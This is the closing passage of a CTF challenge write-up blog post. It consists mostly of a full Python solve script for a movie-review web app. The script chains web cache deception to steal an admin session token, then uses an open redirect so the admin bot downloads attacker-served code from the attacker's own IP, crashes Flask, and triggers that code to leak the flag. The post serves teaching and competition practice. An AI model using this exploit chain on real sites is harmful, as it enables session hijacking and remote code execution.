</span></span><span style="display:flex;"><span>visit_link_payload <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;review_url&#34;</span>:<span style="color:#f1fa8c">&#34;/api/user/self2.css&#34;</span>}
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> moderator_session<span style="color:#ff79c6">.</span>post(visit_link_url, json<span style="color:#ff79c6">=</span>visit_link_payload)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to make the admin bot visit the cache link&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Admin bot visited the cache link&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Grabbing the admin session token from the cached link</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Grabbing the admin session token from the cache link&#34;</span>)
</span></span><span style="display:flex;"><span>admin_session_token <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>cached_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>target_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/api/user/self2.css&#34;</span>
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> moderator_session<span style="color:#ff79c6">.</span>get(cached_url)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to grab the admin session token&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;admin&#34;</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">in</span> response<span style="color:#ff79c6">.</span>text:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Admin session token not found in the cache link&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>admin_session_token <span style="color:#ff79c6">=</span> response<span style="color:#ff79c6">.</span>json()<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#34;session_token&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> admin_session_token:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to extract admin session token&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;[+] Admin session token: </span><span style="color:#f1fa8c">{</span>admin_session_token<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Logging in as admin</span>
</span></span><span style="display:flex;"><span>admin_session <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>session()
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Setting session token as admin&#34;</span>)
</span></span><span style="display:flex;"><span>admin_session<span style="color:#ff79c6">.</span>cookies<span style="color:#ff79c6">.</span>set(<span style="color:#f1fa8c">&#34;session&#34;</span>, admin_session_token)
</span></span><span style="display:flex;"><span>r <span style="color:#ff79c6">=</span> admin_session<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>target_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/api/admin/get_users&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> r<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to login as admin&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Logged in as admin&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># go through all users and find the user with username containing &#34;DDC{&#34; and print it</span>
</span></span><span style="display:flex;"><span>users <span style="color:#ff79c6">=</span> r<span style="color:#ff79c6">.</span>json()
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> user <span style="color:#ff79c6">in</span> users:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;DDC{&#34;</span> <span style="color:#ff79c6">in</span> user[<span style="color:#f1fa8c">&#39;username&#39;</span>]:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;[+] Found the first flag: </span><span style="color:#f1fa8c">{</span>user[<span style="color:#f1fa8c">&#39;username&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Enable experimental mode</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Enabling experimental mode&#34;</span>)
</span></span><span style="display:flex;"><span>enable_experiments_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>target_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/api/admin/update_experiments&#34;</span>
</span></span><span style="display:flex;"><span>enable_experiments_payload <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;experiments&#34;</span>: <span style="color:#ff79c6">True</span>}
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> admin_session<span style="color:#ff79c6">.</span>post(enable_experiments_url, json<span style="color:#ff79c6">=</span>enable_experiments_payload)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to enable experimental mode&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Experimental mode enabled&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Create the index.html file</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Creating the index.html file&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;index.html&#39;</span>, <span style="color:#f1fa8c">&#39;w&#39;</span>)<span style="color:#ff79c6">.</span>write(<span style="color:#f1fa8c">&#39;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;&#39;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;x&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">1000</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">1000</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">50</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&#39;</span>) <span style="color:#6272a4"># From create.py</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Finished creating the large index.html file&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Start up the http.server with https to serve the index.html file</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;[*] Starting the http.server with https on https://</span><span style="color:#f1fa8c">{</span>my_ip<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/&#34;</span>)
</span></span><span style="display:flex;"><span>subprocess<span style="color:#ff79c6">.</span>Popen([<span style="color:#f1fa8c">&#34;python3&#34;</span>, <span style="color:#f1fa8c">&#34;httpsserver.py&#34;</span>], stdout<span style="color:#ff79c6">=</span>subprocess<span style="color:#ff79c6">.</span>DEVNULL, stderr<span style="color:#ff79c6">=</span>subprocess<span style="color:#ff79c6">.</span>DEVNULL)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Started the https.server with https&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Make the admin bot visit open redirect to download &#39;html.py&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Making the admin bot visit the open redirect link to download &#39;html.py&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>visit_link_payload <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;review_url&#34;</span>: <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;/admin/impersonate?username=admin&amp;redirect_to=https://</span><span style="color:#f1fa8c">{</span>my_ip<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/html.py&#34;</span>}
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> admin_session<span style="color:#ff79c6">.</span>post(visit_link_url, json<span style="color:#ff79c6">=</span>visit_link_payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to make the admin bot visit the open redirect link&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Admin bot visited the open redirect link and &#39;time.py&#39; was downloaded&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Make the admin bot visit the open redirect to try to import a large index.html to crash flask</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Making the admin bot visit the open redirect link to try to import a large index.html to crash flask&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">5</span>):
</span></span><span style="display:flex;"><span>    visit_link_payload <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;review_url&#34;</span>: <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;/admin/impersonate?username=admin&amp;redirect_to=https://</span><span style="color:#f1fa8c">{</span>my_ip<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/index.html&#34;</span>}
</span></span><span style="display:flex;"><span>    response <span style="color:#ff79c6">=</span> admin_session<span style="color:#ff79c6">.</span>post(visit_link_url, json<span style="color:#ff79c6">=</span>visit_link_payload)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">503</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> i <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">4</span>:  <span style="color:#6272a4"># Last attempt</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to make the admin bot visit the open redirect link and crash flask after 5 attempts&#34;</span>)
</span></span><span style="display:flex;"><span>        exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)  <span style="color:#6272a4"># Wait between attempts</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Admin bot visited the open redirect link and crashed flask&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Logging in as moderator</span>
</span></span><span style="display:flex;"><span>moderator_session <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>session()
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Logging in as moderator to trigger the html.py execution and leak the flag&#34;</span>)
</span></span><span style="display:flex;"><span>login_payload<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#34;password&#34;</span>: <span style="color:#f1fa8c">&#34;a&#34;</span>, <span style="color:#f1fa8c">&#34;username&#34;</span>: <span style="color:#f1fa8c">&#34;moderator@movie-review.local&#34;</span>}
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> moderator_session<span style="color:#ff79c6">.</span>post(login_url, json<span style="color:#ff79c6">=</span>login_payload)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to login as moderator&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Logged in as moderator&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Get the movies from the api to trigger the html.py execution and leak the flag</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Getting the movies from the api to trigger the html.py execution and leak the flag&#34;</span>)
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> moderator_session<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>target_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/api/get_movies&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get the api&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Got the api and caused the flag to be leaked&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Get the flag</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Getting the flag&#34;</span>)
</span></span><span style="display:flex;"><span>r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>target_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/static/flag.css&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> r<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get the flag&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;[+] Found the second flag: </span><span style="color:#f1fa8c">{</span>r<span style="color:#ff79c6">.</span>text<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span></code></pre></div><p>And running it:
<video autoplay loop muted playsinline controls>
<source src="/solution.webm" type="video/webm">
Your browser does not support the video tag.
</video></p>
<h2 class="heading" id="outro">
  Outro
  <a class="anchor" href="#outro">#</a>
</h2>
<p>Thanks for reading this comprehensive writeup, many of the vulnerabilities used here are ones I have found when doing bug bounty hunting&hellip;</p>
<p>I am again really thrilled to have been given this opportunity to create this CTF challenge, I hope you had fun struggling with it. If you have any comments let me know on Linkedin or Discord :-)</p>

    
  </div>

  


  

  
  

<div class="single-pagination">
    <hr />

    <div class="flex">

        <div class="single-pagination-prev">
            
            <div class="single-pagination-container-prev">
                <div class="single-pagination-text">←</div>
                <div class="single-pagination-text">
                    <a href="/posts/gift/">
                        DDC 2022 &#39;Gift&#39; Writeup
                    </a>
                </div>
            </div>
            
        </div>

        <div class="single-pagination-next">
            
        </div>

    </div>

    <hr />
</div>



  

  

  
  <div class="back-to-top">
    <a href="#top">
      back to top
    </a>
  </div>
  

</div>


    </main>
  </div>

  <footer>
    

    
    <p>Powered by
        <a href="https://gohugo.io/">Hugo</a>
        and
        <a href="https://github.com/tomfran/typo">tomfran/typo</a>
    </p>
    
    
    


  </footer>

  

</body>

<script>

  function isAuto() {
    return document.body.classList.contains("auto");
  }

  function setTheme() {
    if (!isAuto()) {
      return
    }

    document.body.classList.remove("auto");
    let cls = "light";
    if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
      cls = "dark";
    }

    document.body.classList.add(cls);
  }

  function invertBody() {
    document.body.classList.toggle("dark");
    document.body.classList.toggle("light");
  }

  if (isAuto()) {
    window.matchMedia('(prefers-color-scheme: dark)').addListener(invertBody);
  }

  setTheme();

</script>

<script defer src="/js/copy-code.js"></script>
</html>